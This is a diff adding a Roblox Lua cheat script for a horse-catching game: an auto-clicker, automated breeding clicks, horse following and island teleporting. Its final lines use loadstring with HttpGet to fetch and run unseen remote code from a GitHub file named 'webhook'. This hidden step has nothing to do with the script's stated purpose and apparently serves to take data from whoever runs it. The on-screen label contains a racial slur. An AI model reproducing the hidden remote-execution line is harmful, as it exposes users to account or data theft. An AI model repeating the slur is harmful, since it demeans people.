@@ -1,0 +1,429 @@
+-- ServicesA
+local players = game:GetService("Players")
+local lp = players.LocalPlayer
+local playerGui = lp:WaitForChild("PlayerGui")
+local VIM = game:GetService("VirtualInputManager")
+local Camera = workspace.CurrentCamera
+
+-- State
+local currentTask
+local shouldStop = false
+local isPaused = false
+local currentIslandIndex = 1
+local clickLoop = nil
+local isBreeding = false -- Flag to prevent auto-clicker from interfering with breeding clicks
+local islands = {
+  "Mainland",
+	"Blizzard Island",
+	"Forest Island"
+}
+
+-- Breeding Script Variables
+local itemInfoFrame = playerGui:WaitForChild("SubMenus"):WaitForChild("Item Information")
+local indicatorLabel = itemInfoFrame.Animals.Main.Content.Top.Labels.IndicatorLabel
+local closeButton = itemInfoFrame.Animals.Main.CloseMenu
+local buttonsContainer = itemInfoFrame.Animals.Main.Content.Buttons
+local TARGET_IMAGE_ID = "rbxassetid://13116451197"
+local isProcessingBreed = false
+
+-- Virtual Input Manager Functions
+local function getScreenSize()
+	return Camera.ViewportSize
+end
+
+local function getClickPosition()
+	local screenSize = getScreenSize()
+	local x = screenSize.X - 300  -- 300 pixels from right edge
+	local y = 30                   -- 30 pixels from top
+	return x, y
+end
+
+local function clickAt(x, y)
+	VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)  -- Mouse down
+	task.wait(0.05)
+	VIM:SendMouseButtonEvent(x, y, 0, false, game, 0) -- Mouse up
+end
+
+local function startAutoClicker()
+	if clickLoop then
+		task.cancel(clickLoop)
+	end
+	
+	clickLoop = task.spawn(function()
+		while true do
+			-- Only click if not paused AND not currently breeding
+			if not isPaused and not isBreeding then
+				local x, y = getClickPosition()
+				clickAt(x, y)
+			end
+			task.wait(0.5)
+		end
+	end)
+end
+
+-- Breeding Script Functions
+local function clickButtonVIM(button)
+	if not button:IsA("TextButton") and not button:IsA("ImageButton") then
+		return
+	end
+	
+	print("Clicking button with VirtualInputManager: " .. button.Name)
+	
+	-- Get button position
+	local buttonPos = button.AbsolutePosition
+	local buttonSize = button.AbsoluteSize
+	local centerX = buttonPos.X + (buttonSize.X / 2) + 15
+	local centerY = buttonPos.Y + (buttonSize.Y / 2) + 50  -- Added 50 pixels down
+	
+	-- Add 5-pixel right offset for close button
+	if button.Name == "CloseMenu" then
+		centerX = centerX + 8
+		centerY = centerY + 2
+	end
+	
+	-- Simulate mouse click at button center
+	VIM:SendMouseButtonEvent(centerX, centerY, 0, true, game, 0)
+	task.wait(0.1)
+	VIM:SendMouseButtonEvent(centerX, centerY, 0, false, game, 0)
+	
+	print("VIM click sent on: " .. button.Name)
+end
+
+local function clickYesButtonVIM(button)
+	if not button:IsA("TextButton") and not button:IsA("ImageButton") then
+		return
+	end
+	
+	print("Clicking Yes button with VirtualInputManager")
+	
+	-- Get button position
+	local buttonPos = button.AbsolutePosition
+	local buttonSize = button.AbsoluteSize
+	local centerX = buttonPos.X + (buttonSize.X / 2) + 5
+	local centerY = buttonPos.Y + (buttonSize.Y / 2) + 50  -- Added 50 pixels down
+	
+	print("Button center position (adjusted): X=" .. centerX .. " Y=" .. centerY)
+	
+	-- Simulate mouse click at button center
+	VIM:SendMouseButtonEvent(centerX, centerY, 0, true, game, 0)
+	task.wait(0.1)
+	VIM:SendMouseButtonEvent(centerX, centerY, 0, false, game, 0)
+	
+	print("VIM click sent")
+end
+
+local function onItemInfoOpened()
+	-- Debounce check
+	if isProcessingBreed then
+		return
+	end
+	
+	-- Check if the frame is actually visible
+	if not itemInfoFrame.Visible then
+		return
+	end
+	
+	isProcessingBreed = true
+	isBreeding = true -- Pause auto-clicker
+	
+	-- Wait 0.5 seconds before doing anything to avoid bugs
+	task.wait(0.5)
+	
+	-- Check if IndicatorLabel contains "Unbreedable"
+	local labelText = indicatorLabel.Text
+	
+	if string.find(labelText, "Unbreedable") then
+		-- Contains "Unbreedable" - just close the menu and return
+		print("Item is Unbreedable, closing menu")
+		clickButtonVIM(closeButton)
+		task.wait(1)
+		isProcessingBreed = false
+		isBreeding = false -- Resume auto-clicker
+		return
+	end
+	
+	-- Does NOT contain "Unbreedable" - proceed with breeding logic
+	print("Item is breedable, looking for breed button")
+	
+	-- Look through all OptionButtons in the Buttons container
+	for _, child in ipairs(buttonsContainer:GetChildren()) do
+		if child.Name == "OptionButton" then
+			-- Check if it has an ImageLabel child
+			local imageLabel = child:FindFirstChildWhichIsA("ImageLabel")
+			if imageLabel and imageLabel.Image == TARGET_IMAGE_ID then
+				print("Found breeding button, clicking it")
+				clickButtonVIM(child)
+				
+				-- Wait 1seconds for the prompt to fully appear
+				print("Waiting 1 seconds for YesNo prompt to load...")
+				task.wait(1)
+				
+				-- Click the Yes button with VIM
+				local success, err = pcall(function()
+					local prompts = playerGui:WaitForChild("Prompts", 3)
+					local yesNo = prompts:WaitForChild("YesNo", 3)
+					local yesButton = yesNo.Content.Frame.Yes
+					
+					print("Found Yes button, waiting 1 second...")
+					task.wait(0.1)
+					
+					clickYesButtonVIM(yesButton)
+				end)
+				
+				if not success then
+					warn("Failed to click Yes button: " .. tostring(err))
+				end
+				
+				break
+			end
+		end
+	end
+	
+	-- Reset debounce and resume auto-clicker after a delay
+	task.wait(0.5)
+	isProcessingBreed = false
+	isBreeding = false
+end
+
+-- Create GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "HorseCatcherGUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 220, 0, 80)
+frame.Position = UDim2.new(0, 10, 0, 10)
+frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = frame
+
+local islandLabel = Instance.new("TextLabel")
+islandLabel.Size = UDim2.new(1, -20, 0, 30)
+islandLabel.Position = UDim2.new(0, 10, 0, 10)
+islandLabel.BackgroundTransparency = 1
+islandLabel.Text = "ania nigger mainland destroy"
+islandLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+islandLabel.TextSize = 14
+islandLabel.Font = Enum.Font.GothamBold
+islandLabel.TextXAlignment = Enum.TextXAlignment.Left
+islandLabel.Parent = frame
+
+local pauseButton = Instance.new("TextButton")
+pauseButton.Size = UDim2.new(1, -20, 0, 30)
+pauseButton.Position = UDim2.new(0, 10, 0, 45)
+pauseButton.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
+pauseButton.Text = "Pause"
+pauseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+pauseButton.TextSize = 14
+pauseButton.Font = Enum.Font.GothamBold
+pauseButton.Parent = frame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 6)
+buttonCorner.Parent = pauseButton
+
+-- Island Travel Function
+local function movePlayerToIsland(islandName)
+	local char = lp.Character or lp.CharacterAdded:Wait()
+	
+	local islandFolder = workspace.Islands:FindFirstChild(islandName)
+	if not islandFolder then
+		warn("Island not found:", islandName)
+		return false
+	end
+	
+	print("Attempting to travel to:", islandName)
+	
+	-- Try to invoke the travel system properly
+	local References = game:GetService("ReplicatedStorage"):WaitForChild("References")
+	local Utilities = require(References).Utilities
+	
+	-- Use the same method as the game's TravelHandler
+	local success, result = pcall(function()
+		return Utilities.Network:InvokeServer("Travel", "Travel", islandName, nil, nil)
+	end)
+	
+	if success then
+		print("Travel request successful for:", islandName)
+		print("Result:", result)
+		
+		-- Move character model into the island folder
+		char.Parent = islandFolder
+		
+		task.wait(3) -- Wait for targets to load in
+		return true
+	else
+		warn("Travel request failed:", result)
+		
+		-- Fallback: Just move the character model
+		char.Parent = islandFolder
+		task.wait(3)
+		return true
+	end
+end
+
+-- Follow Logic
+local function followLoopFrom(folder)
+	-- Signal the old task to stop
+	shouldStop = true
+	task.wait(0.3) -- Give it time to stop
+	shouldStop = false
+	
+	local function getValidTargets()
+		local targets = {}
+		for _, model in ipairs(folder:GetChildren()) do
+			if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") then
+				local hasManeMesh = model:FindFirstChild("maneMesh")
+				local isReindeer = false
+				
+				-- Check for Reindeer breed
+				local overheadPart = model:FindFirstChild("OverheadPart")
+				if overheadPart then
+					local overHead = overheadPart:FindFirstChild("OverHead")
+					if overHead then
+						local breedLabel = overHead:FindFirstChild("BreedLabel")
+						if breedLabel and breedLabel.Text == "Reindeer" then
+							isReindeer = true
+						end
+					end
+				end
+				
+				if hasManeMesh or isReindeer then
+					table.insert(targets, model)
+				end
+			end
+		end
+		return targets
+	end
+	
+	currentTask = task.spawn(function()
+		local currentTarget = nil
+		local lastSwitch = 0
+		local noTargetChecks = 0
+		
+		while not shouldStop do
+			if isPaused then
+				task.wait(0.5)
+				continue
+			end
+			
+			-- Refresh character and hrp references each loop
+			local char = lp.Character
+			if not char then
+				task.wait(0.2)
+				continue
+			end
+			
+			local hrp = char:FindFirstChild("HumanoidRootPart")
+			local humanoid = char:FindFirstChildOfClass("Humanoid")
+			if not hrp or not humanoid then
+				task.wait(0.2)
+				continue
+			end
+			
+			local now = tick()
+			local targets = getValidTargets()
+			
+			-- Check if no valid targets exist
+			if #targets == 0 then
+				noTargetChecks = noTargetChecks + 1
+				
+				if noTargetChecks >= 3 then -- Check 3 times to be sure
+					print("No valid targets found in:", islands[currentIslandIndex])
+					
+					-- Try next island
+					currentIslandIndex = currentIslandIndex + 1
+					if currentIslandIndex > #islands then
+						print("No more islands to check. Restarting from first island.")
+						currentIslandIndex = 1
+					end
+					
+					local nextIsland = islands[currentIslandIndex]
+					print("Switching to:", nextIsland)
+					
+					if movePlayerToIsland(nextIsland) then
+						local newFolder = workspace.Islands:FindFirstChild(nextIsland)
+						if newFolder then
+							followLoopFrom(newFolder)
+							return -- Exit current loop
+						end
+					end
+					
+					noTargetChecks = 0
+				end
+				
+				task.wait(1)
+			else
+				noTargetChecks = 0 -- Reset counter when targets are found
+				
+				-- Switch target every 15 seconds or if lost
+				if not currentTarget or not currentTarget.Parent or now - lastSwitch >= 15 then
+					local newTarget
+					repeat
+						newTarget = targets[math.random(1, #targets)]
+					until newTarget ~= currentTarget or #targets == 1
+					
+					currentTarget = newTarget
+					lastSwitch = now
+					
+					local targetHRP = currentTarget:FindFirstChild("HumanoidRootPart")
+					if targetHRP then
+						local targetPos = targetHRP.Position + Vector3.new(0, 0, -5)
+						humanoid:MoveTo(targetPos)
+					end
+				end
+				
+				-- Follow current target
+				if currentTarget and currentTarget:FindFirstChild("HumanoidRootPart") then
+					local targetHRP = currentTarget.HumanoidRootPart
+					local distance = (hrp.Position - targetHRP.Position).Magnitude
+					
+					if distance > 6 then
+						local targetPos = targetHRP.Position + Vector3.new(0, 0, -4)
+						humanoid:MoveTo(targetPos)
+					end
+					
+					if distance > 30 then
+						hrp.CFrame = targetHRP.CFrame * CFrame.new(0, 0, -4)
+					end
+				end
+				
+				task.wait(0.2)
+			end
+		end
+	end)
+end
+
+-- Pause/Resume button
+pauseButton.MouseButton1Click:Connect(function()
+	isPaused = not isPaused
+	if isPaused then
+		pauseButton.Text = "Resume"
+		pauseButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+	else
+		pauseButton.Text = "Pause"
+		pauseButton.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
+	end
+end)
+
+-- Monitor Item Information frame for breeding
+itemInfoFrame:GetPropertyChangedSignal("Visible"):Connect(function()
+	if itemInfoFrame.Visible then
+		onItemInfoOpened()
+	end
+end)
+
+-- Start auto-clicker
+startAutoClicker()
+
+-- Auto-start scanning Royal Island
+followLoopFrom(workspace.Islands["Blizzard Island"])
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
+
+print("Hordldkkdk!")
